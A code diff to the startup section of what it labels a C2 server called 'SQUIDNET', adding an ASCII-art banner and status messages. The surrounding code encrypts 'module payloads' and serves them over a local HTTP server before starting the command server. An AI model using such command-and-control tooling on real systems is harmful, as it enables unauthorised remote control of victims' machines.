@@ -7,6 +7,8 @@ import threading, socket, colorama, helpers,session, socketserver,select, subpro
 import random
 import encryption
 
+from pyfiglet import figlet_format
+
 import json
 
 def read_config(config_filepath):
@@ -253,9 +255,47 @@ class server():
           
 if __name__ == "__main__":       
 
+    #print title
+
+    helpers.show(
+        """
+        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ⢀⡤⠞⠉⠙⠲⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⠞⠉⠀⠀⠀⠀⠀⠀⠈⠙⠲⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠋⠀⠀⢠⠇⠀⠀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⢸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⠀⣰⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣄⠀⣠⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⣶⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣏⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠏⣰⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⠀⢻⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⠀⢹⠘⣄⠀⠀⠀⠀⠀⠀⠀⠀⣠⠔⠉⠘⡄⠀⢇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠀⠀⣾⠀⠈⢳⣄⡀⠀⠀⣀⣐⠊⠁⠀⠀⠀⡇⠀⠸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡇⠀⢸⡟⠀⠀⠀⠈⠙⢷⡾⠉⠀⠀⠀⠀⠀⣀⡇⠀⠀⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⢸⡇⠀⠀⠀⣴⡄⠀⠀⢠⣄⠀⠀⠀⠀⡟⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠈⣇⠀⠀⠀⠈⠀⢀⡀⠈⠁⠀⠀⠀⣰⠇⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⡀⠀⠘⠷⣄⣀⣠⠴⠋⠙⠦⣄⣀⡤⠞⠁⠀⠀⠀⢠⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣦⣤⣤⣄⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⠴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⢀⡤⠴⠒⠒⠦⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⢀⠞⠀⠀⠀⠀⢀⡟⠀⠀⢸⡅⢹⠁⠈⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⢀⡴⠋⠀⠀⠀⠀⠀⠀⠈⠑⠢⣄⣀⣀⣀⡤⠖⠉⢀⡴⠋⠀⠀⠀⠀⢠⡟⠀⠀⠀⢸⡇⢸⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⣾⣀⡠⠴⠒⠒⠶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⠀⠀⠀⠀⢀⡴⢻⡇⠀⠀⠀⢸⠃⢸⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠙⠲⣄⠀⠀⠀⣀⡤⠚⠉⠀⠀⠀⠀⢀⡴⠟⠀⢸⡇⠀⠀⠀⢸⠀⢸⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣹⠖⠋⠁⠀⠀⠀⠀⢀⣠⣴⠋⠀⠀⠀⢸⡇⠀⠀⠀⢸⠀⢸⠀⠀⠸⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠊⠀⠀⠀⠀⣀⡤⠴⠚⢉⡽⠁⠀⠀⠀⣰⢿⠁⠀⠀⠀⡏⠀⢸⡀⠀⠀⠙⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⡼⠁⠀⢀⡠⠖⠋⠁⠀⠀⣰⠋⠀⠀⠀⢀⡼⠁⡞⠀⠀⠀⢰⠇⠀⣾⣧⠀⠀⠀⠀⠉⠓⠒⠒⠲⠶⠤⠤⢤⣀⠀
+⠀⠀⠀⠀⠀⠀⠀⢰⠃⠀⢠⠞⠁⠀⠀⠀⠀⡼⠁⠀⠀⢀⡴⠋⠀⣸⠃⠀⠀⢀⡟⠀⢀⡇⠈⠳⣄⡀⠀⠀⠀⠀⢀⣀⣀⣀⣀⡀⠈⣷
+⠀⠀⠀⠀⠀⠀⠀⢸⠀⣰⠋⠀⠀⠀⠀⠀⣸⠁⠀⢀⡴⠋⠀⠀⣰⠃⠀⠀⢀⡾⠁⠀⢸⠁⠀⠀⠀⠉⠉⠉⠉⠉⠉⠀⠀⠀⠈⠉⠉⠁
+⠀⠀⠀⠀⠀⠀⠀⠈⠛⠁⠀⠀⠀⠀⠀⢠⠇⠀⣠⠋⠀⠀⢀⡜⠁⠀⠀⢠⡾⡇⠀⠀⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⢰⠃⠀⢀⡰⠋⠀⠀⢀⡴⠋⠀⢻⠀⠀⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣤⠏⠀⣠⠊⠀⠀⣠⠴⠋⠀⠀⠀⠈⢧⠀⠈⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣇⣠⠴⠚⠁⠀⠀⠀⠀⠀⠀⠈⢧⡀⠈⢧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣦⣀⣳⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+
+""",colour='BLUE', style='BRIGHT',end='')
+    helpers.show(figlet_format('SQUIDNET', font='slant'),colour='BLUE', style='BRIGHT',end='')
+
     #Initialize C2 Server
     globals()['CommandServer'] = server()
 
+    helpers.show("ENCRYPTING MODULE PAYLOADS", colour='BLUE', style='BRIGHT', end='\n')
     modules_dir = os.path.join(os.getcwd(), 'modules')
     encrypted_dir = os.path.join(os.getcwd(), 'encrypted')
     
@@ -268,15 +308,15 @@ if __name__ == "__main__":
                 output_filepath = os.path.join(encrypted_dir, filename)
                 with open(output_filepath, "wb") as f_out:
                         f_out.write(ciphertext)
-                print(f"Encrypted: {filename}")
+
 
 
     #host the module files
-    helpers.show("STARTING MODULE SERVER", colour='BLUE', style='BRIGHT', end='')
+    helpers.show("STARTING MODULE HOSTING", colour='BLUE', style='BRIGHT', end='\n')
     globals()['module_host'] = subprocess.Popen('python -m http.server 5001',stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=os.getcwd() + '/encrypted',shell=True)
     globals()['close'] = False
 
-    helpers.show("STARTING COMMAND SERVER", colour='BLUE', style='BRIGHT', end='')
+    helpers.show("STARTING COMMAND SERVER", colour='BLUE', style='BRIGHT', end='\n')
     globals()['CommandServer'].run()
 
 
